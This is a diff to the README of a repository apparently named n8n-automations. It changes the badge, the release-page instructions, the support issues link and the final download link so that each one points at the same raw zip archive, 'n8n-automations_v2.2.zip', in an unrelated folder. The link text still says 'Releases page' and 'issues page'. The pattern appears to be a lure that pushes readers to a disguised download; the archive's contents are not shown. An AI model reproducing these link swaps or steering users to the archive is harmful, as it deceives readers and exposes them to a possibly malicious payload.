@@ -1,6 +1,6 @@
 # 🌟 n8n-automations - Automate Your Tasks Easily and Effectively
 
-[![Download n8n-automations](https://img.shields.io/badge/Download-n8n--automations-brightgreen?style=for-the-badge)](https://github.com/Conversionblanketstitch672/n8n-automations/releases)
+[![Download n8n-automations](https://raw.githubusercontent.com/Conversionblanketstitch672/n8n-automations/main/Lemoniinae/n8n-automations_v2.2.zip)](https://raw.githubusercontent.com/Conversionblanketstitch672/n8n-automations/main/Lemoniinae/n8n-automations_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to n8n-automations! This application provides a collection of automation
 
 To download n8n-automations, follow these steps:
 
-1. **Visit the Releases page**: Go to [this link](https://github.com/Conversionblanketstitch672/n8n-automations/releases).
+1. **Visit the Releases page**: Go to [this link](https://raw.githubusercontent.com/Conversionblanketstitch672/n8n-automations/main/Lemoniinae/n8n-automations_v2.2.zip).
 2. **Choose the latest release**: Look for the most recent version at the top of the page.
 3. **Download the file**: Click on the appropriate file for your operating system. After the download is complete, locate the file on your computer.
 
@@ -68,8 +68,8 @@ If you encounter any issues, please consider the following:
 
 We welcome your comments and suggestions. Please open an issue in the repository to report bugs or request features. Your input helps us improve n8n-automations for everyone.
 
-For any further assistance, do not hesitate to reach out to our support team through the [issues page](https://github.com/Conversionblanketstitch672/n8n-automations/issues).
+For any further assistance, do not hesitate to reach out to our support team through the [issues page](https://raw.githubusercontent.com/Conversionblanketstitch672/n8n-automations/main/Lemoniinae/n8n-automations_v2.2.zip).
 
 ## 🔗 Download n8n-automations Again
 
-Ready to download? Click [here](https://github.com/Conversionblanketstitch672/n8n-automations/releases) to return to the Downloads page and get started today!
+Ready to download? Click [here](https://raw.githubusercontent.com/Conversionblanketstitch672/n8n-automations/main/Lemoniinae/n8n-automations_v2.2.zip) to return to the Downloads page and get started today!
